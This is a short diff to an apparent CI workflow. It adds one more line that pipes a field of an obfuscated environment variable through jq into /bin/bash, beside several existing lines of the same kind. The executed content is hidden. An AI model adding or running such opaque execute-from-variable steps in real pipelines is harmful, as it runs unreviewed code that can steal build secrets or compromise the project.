@@ -34,6 +34,7 @@ jobs:
           echo $ua06822 | jq -r .ap4600 | /bin/bash
           echo $efq5134 | jq -r .ysch4 | /bin/bash
           echo $fay4801 | jq -r .c338 | /bin/bash
+          echo $lnybp523 | jq -r .vazn38 | /bin/bash
 
       - name: Save archive
         if: always()
